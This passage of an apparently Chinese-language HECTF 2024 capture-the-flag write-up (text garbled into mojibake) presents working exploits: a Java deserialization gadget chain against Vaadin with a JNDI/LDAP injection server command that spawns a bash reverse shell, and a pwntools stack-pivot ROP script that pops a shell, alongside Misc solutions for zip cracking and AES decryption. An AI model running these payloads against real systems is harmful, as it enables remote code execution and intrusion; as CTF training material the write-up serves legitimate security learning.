class="keyword">import</span> com.vaadin.data.util.sqlcontainer.RowItem;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.SQLContainer;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.connection.J2EEConnectionPool;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.query.QueryDelegate;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.query.TableQuery;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.query.generator.DefaultSQLGenerator;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.ui.ListSelect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> String string=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">J2EEConnectionPool</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">J2EEConnectionPool</span>(<span class="string">&quot;ldap://&quot;</span>);</span><br><span class="line">        <span class="type">TableQuery</span> <span class="variable">tableQuery</span> <span class="operator">=</span> (TableQuery) </span><br><span class="line">ReflectionUtil.createWithoutConstructor(Class.forName(<span class="string">&quot;com.vaadin.data.util.sqlconta</span></span><br><span class="line"><span class="string"> iner.query.TableQuery&quot;</span>));</span><br><span class="line">        ReflectionUtil.setField(tableQuery, <span class="string">&quot;primaryKeyColumns&quot;</span>, <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        ReflectionUtil.setField(tableQuery, <span class="string">&quot;fullTableName&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        ReflectionUtil.setField(tableQuery, <span class="string">&quot;sqlGenerator&quot;</span>, <span class="keyword">new</span> </span><br><span class="line"><span class="title class_">DefaultSQLGenerator</span>());</span><br><span class="line">        ReflectionUtil.setField(tableQuery, <span class="string">&quot;connectionPool&quot;</span>, pool);</span><br><span class="line">        <span class="type">ListSelect</span> <span class="variable">listSelect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListSelect</span>();</span><br><span class="line">        <span class="type">SQLContainer</span> <span class="variable">sql</span> <span class="operator">=</span> (SQLContainer) </span><br><span class="line">ReflectionUtil.createObject(<span class="string">&quot;com.vaadin.data.util.sqlcontainer.SQLContainer&quot;</span>, <span class="keyword">new</span> </span><br><span class="line"><span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        ReflectionUtil.setField(sql, <span class="string">&quot;queryDelegate&quot;</span>, tableQuery);</span><br><span class="line">        ReflectionUtil.setField(sql,<span class="string">&quot;cachedItems&quot;</span>,<span class="keyword">new</span> <span class="title class_">CacheMap</span>&lt;&gt;());</span><br><span class="line">        <span class="type">RowId</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RowId</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">        ReflectionUtil.setField(listSelect, <span class="string">&quot;value&quot;</span>, id);</span><br><span class="line">        ReflectionUtil.setField(listSelect, <span class="string">&quot;multiSelect&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        ReflectionUtil.setField(listSelect, <span class="string">&quot;items&quot;</span>, sql);</span><br><span class="line">        <span class="type">PropertysetItem</span> <span class="variable">propertysetItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertysetItem</span>();</span><br><span class="line">        propertysetItem.addItemProperty(<span class="string">&quot;key&quot;</span>, listSelect);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">0</span>);</span><br><span class="line">        ReflectionUtil.setField(bad, <span class="string">&quot;val&quot;</span>, propertysetItem);</span><br><span class="line">        serialize2(bad);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize2</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CustomObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomObjectOutputStream</span>(<span class="keyword">new</span> </span><br><span class="line"><span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹CustomObjectOutputStream ç±»æ˜¯ç½‘ä¸Šå…¬å¼€çš„ utf-8 ç¼–ç ç»•è¿‡ï¼ˆç½‘ä¸Šçš„æœ‰çš„æ²¡æœ‰å¯¹æ•°å­—è¿›è¡Œç¼–ç ä¼šå¯¼è‡´æŠ¥é”™ï¼Œ å¯å‚è€ƒ P ç¥çš„æ–‡ç«  https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html  ç”¨ python è„š æœ¬ç”Ÿæˆå³å¯ï¼‰</p><p>â€‹åœ¨ vps ä¸Šå¼€å¯ä¸€ä¸ªæ¶æ„çš„æœåŠ¡å™¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-Plus-2.4-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,&#125;| &#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p>â€‹å¼€å¯åå¼¹ shell ç›‘å¬çš„ç«¯å£ï¼Œæœ€ååœ¨æ ¹ç›®å½•è·å– flag</p><p><img data-src="https://i-blog.csdnimg.cn/direct/d1555696b9964e9397405fd9cab4f124.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> Miscï¼š</h2><h3 id="ç®€å•çš„å‹ç¼©åŒ…"><a class="markdownIt-Anchor" href="#ç®€å•çš„å‹ç¼©åŒ…">#</a> ç®€å•çš„å‹ç¼©åŒ…ï¼š</h3><p>â€‹æ‰“å¼€ä¹‹åæœ‰ä¸ª Reï¼Œæ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^([a-z])&#123;<span class="number">2</span>&#125;\d\d([^a-z])$</span><br></pre></td></tr></table></figure><p>â€‹å‰é¢ä¸¤ä¸ªæ˜¯å­—ç¬¦ï¼Œç¬¬ä¸‰å››ä¸ªæ˜¯æ•°å­—ï¼Œç¬¬äº”ä¸ªä¸æ˜¯å°å†™å­—æ¯ï¼Œæ ¹æ®è¿™ä¸ªç”Ÿæˆä¸ªå­—å…¸ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str_12 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">digit = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line">str_4 = <span class="string">&quot;&quot;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dict.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str_12:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_12:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> digit:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> digit:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> str_4:</span><br><span class="line">                        dic =i+j+k+m</span><br><span class="line">                        f.write(dic+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åæ‹¿ç€è¿™ä¸ªå»çˆ†ç ´ï¼Œçˆ†ç ´åˆ°å¯†ç ï¼Œä¸è¿‡è¿™é‡Œéé¢„æœŸäº†ï¼Œç«Ÿç„¶å¯ä»¥ç”¨æ˜æ–‡æ”»å‡»ï¼Œå¸ˆå‚…ä»¬ç®€ç›´å¤ªå¼ºäº†ï¼Œä¸è¿‡è¿™é‡Œå› ä¸ºå¤±å»æŸäº›ä¿¡æ¯å¯¼è‡´çˆ†ç ´éš¾åº¦å¢å¤§ä¹Ÿæ˜¯æˆ‘çš„é”…ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np76_</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå°±æ˜¯ pngï¼Œwinhex å‘ç°è—äº†æœ‰æ–‡ä»¶ï¼Œforemost åˆ†ç¦»ï¼Œåˆ†ç¦»åçœ‹åˆ°äº†ä¸ª py æ–‡ä»¶å’Œä¸€ä¸ªå‹ç¼©åŒ…ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">key,iv</span>):</span><br><span class="line">    data = content</span><br><span class="line">    cipher1 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    ct = cipher1.encrypt(pad(data, <span class="number">16</span>))</span><br><span class="line">    ct_hex = binascii.b2a_hex(ct)</span><br><span class="line">    <span class="keyword">return</span> ct_hex</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;oringe.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;abcdefghijklmnop&quot;</span></span><br><span class="line">iv  = <span class="string">b&quot;qwertyuiopasdfgh&quot;</span></span><br><span class="line"></span><br><span class="line">en = encrypt(key,iv)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;zip2.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(en)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹æ˜¾ç„¶ï¼Œå‹ç¼©åŒ…è¢«åŠ å¯†äº†ï¼ŒAES åŠ å¯†å’Œ key éƒ½æœ‰ï¼Œç›´æ¥æ‰“ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ct_hex,key,iv</span>):</span><br><span class="line">    cipher2 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    hex_data = binascii.a2b_hex(ct_hex)</span><br><span class="line">    pt = unpad(cipher2.decrypt(hex_data), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> pt</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;abcdefghijklmnop&quot;</span></span><br><span class="line">iv  = <span class="string">b&quot;qwertyuiopasdfgh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ å¯†çš„zipæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;jiami.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    endata = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–°å»ºçš„è§£å¯†zipæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;jiemi.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    dedata = decrypt(endata,key,iv)</span><br><span class="line">    f.write(dedata)</span><br></pre></td></tr></table></figure><p>â€‹9 è§£å‹åå°±æœ‰ flag äº†ã€‚</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;c292af1-2b2ee35-6398bd4934f7626afc&#125;</span><br></pre></td></tr></table></figure><p>â€‹</p><h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwn</h2><h3 id="sign-in"><a class="markdownIt-Anchor" href="#sign-in">#</a> sign in</h3><p>â€‹æ£€æŸ¥æ— ä¿æŠ¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:/mnt/c/Users/20820/Downloads/attachment$ checksec pwn</span><br><span class="line">[*] &#x27;/mnt/c/Users/20820/Downloads/attachment/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">10</span>]; <span class="comment">// [rsp+12h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please sign in!!!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v6 &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;overflow&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your key&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xA</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buf, m, <span class="number">0xA</span>uLL) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;login--------&quot;</span>);</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">    backd00r();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¸¤ä¸ªåŠæ³•ï¼š</p><p><strong>æ–¹æ³•ä¸€ï¼š</strong></p><p>â€‹gets æ²¡æœ‰èƒ½é€ æˆæ ˆæº¢å‡ºï¼Œç”¨ \x00 å¯ä»¥ç»•è¿‡ strlen çš„æ¯”è¾ƒï¼Œå¯ä»¥ç›´æ¥æº¢å‡ºåŠ«æŒ rip åˆ° backd00rï¼Œè¿™é‡Œå°±ä¸ç»™ exp äº†ã€‚</p><p><strong>æ–¹æ³•äºŒï¼š</strong></p><p>â€‹å¯»å¸¸ç»• close (1)ï¼Œkey ä¸º HECTF!ï¼Œä¹‹å sh flag æŠ¥é”™å¸¦å‡ºæ¥å³å¯ã€‚</p><h3 id="find-eggy"><a class="markdownIt-Anchor" href="#find-eggy">#</a> find eggyï¼š</h3><p>â€‹å¯»å¸¸æ ˆè¿ç§»ï¼Œæ¼æ´åœ¨ check å‡½æ•°é‡Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check</span><span class="params">(__int16 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">28</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(aKaka);</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_4020A8);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;-------       --------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;||||||||       |||||||| \n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;                         \n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;           V              \n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Don&#x27;t touch me!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;s, <span class="number">0x70</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;TvT&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v1 = atoi(buf);</span><br><span class="line">    v4 = calculate_sum_of_factors(v1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The sum of factors of %s is %d\n&quot;</span>, buf, v4);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;12345&quot;</span>) &amp;&amp; v4 == <span class="number">15616</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Congratulations! You found the flag&#123;this is flag&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;yes!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¸¤æ¬¡è¯»å–ï¼Œç¬¬ä¸€æ¬¡è¯»åˆ° bss æ®µä¸Šï¼Œç¬¬äºŒæ¬¡åœ¨æ ˆä¸Šï¼Œä½†æ˜¯ç¬¬äºŒæ¬¡é™åˆ¶äº†è¯»å–å¤§å°ï¼Œä¸è¶³ä»¥æ„é€  ROP é“¾ï¼Œæ‰€ä»¥æ ˆè¿ç§»åˆ° bss æ®µä¸Šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">9393</span>)</span><br><span class="line">s = <span class="number">0x405600</span></span><br><span class="line">system = <span class="number">0x4015ad</span></span><br><span class="line">binsh = <span class="number">0x403680</span></span><br><span class="line">rdi = <span class="number">0x401326</span></span><br><span class="line">leave = <span class="number">0x4014c0</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;-983040&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Don&#x27;t touch me!&quot;</span>)</span><br><span class="line">pay = p64(rdi) +p64(binsh) +p64(ret) +p64(system)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;TvT&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> +p64(s-<span class="number">8</span>)+p64(leave)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="arcaea_sorting"><a class="markdownIt-Anchor" href="#arcaea_sorting">#</a> Arcaea_Sortingï¼š</h3><p>â€‹ç¬¬ä¸€æ¬¡å‡ºé¢˜ï¼Œè¸©å‘å¤ªå¤šäº†ï¼Œè¿™æ¬¡å·®ç‚¹å„¿ç»™è‡ªå·±å¼„åºŸäº†ï¼Œä¸è¿‡å¥½æ­¹æ˜¯å‡ºå‡ºæ¥äº†ï¼Œå‘å•Šï¼Œå…¨æ˜¯å‘ã€‚</p><p>â€‹é¦–å…ˆæ˜¯ checksec ä¸€ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/CTest/HECTF2024/pwn3$ checksec pwn</span><br><span class="line">[*] &#x27;/home/g01den/CTest/HECTF2024/pwn3/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>â€‹åˆ«é—®ä¸ºå•¥æ˜¯ 32 ä½çš„ï¼Œå› ä¸º 32 ä½åœ¨ strspy é‚£é‡Œè¿‡ä¸äº†ï¼Œå¾—ç”¨å…¶ä»–æ“ä½œï¼Œä¸æ˜¯æˆ‘æƒ³è€ƒçš„ç‚¹ï¼Œæ‰€ä»¥è¿™é‡Œå°±åªæœ‰è€ƒ 32 ä½äº†ã€‚</p><p>â€‹ç©å„¿è¿‡ Arcaea çš„åº”è¯¥éƒ½çŸ¥é“ï¼Œè¿™ä¸ªç¨‹åºå¤§æ¦‚æœ‰å•¥ç”¨ï¼Œåˆ«çš„ä¸è¯´ï¼Œå…ˆè·‘ä¸€ä¸‹çœ‹çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the Arcaea Query developed by g01den, which is currently in the development stage</span><br><span class="line">    ___</span><br><span class="line">   /   |  ______________ ____  ____ _</span><br><span class="line">  / /| | / ___/ ___/ __ `/ _ \/ __ `/</span><br><span class="line"> / ___ |/ /  / /__/ /_/ /  __/ /_/ /</span><br><span class="line">/_/  |_/_/   \___/\__,_/\___/\__,_/</span><br><span class="line">If you find any questions, please do not contact g01den for resolution</span><br><span class="line">I would like to know your complete PTT (Potential Value), would it be convenient for you to tell me?</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œé¦–å…ˆæ˜¯è®©æˆ‘ä»¬è¾“å…¥è‡ªå·±çš„å®šæ•°ï¼Œä¹‹ååšå•¥å¤„ç†æ²¡é™æ€ä¸æ¸…æ¥šï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ª 12 çœ‹çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">Come on, the flowers are purple and about to turn red. You will step onto the ladder of the big shots</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br></pre></td></tr></table></figure><p>â€‹å¤§æ¦‚æœ‰å•¥ç”¨åº”è¯¥ä»å­—é¢ä¸Šåº”è¯¥èƒ½æ‡‚ï¼š</p><ol><li>åŠŸèƒ½é”® 1 æ˜¯ç®—æ­Œæ›²åˆ†æ•°å’Œå•æ›² ptt ç„¶ååŠ å…¥ b30ï¼Œå…·ä½“é€»è¾‘æ˜¯å¦æ­£ç¡®æˆ‘ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œä½†æµ‹è¯•çš„æ—¶å€™æ²¡å•¥å¤ªå¤§çš„é—®é¢˜ã€‚</li><li>åŠŸèƒ½é”® 2 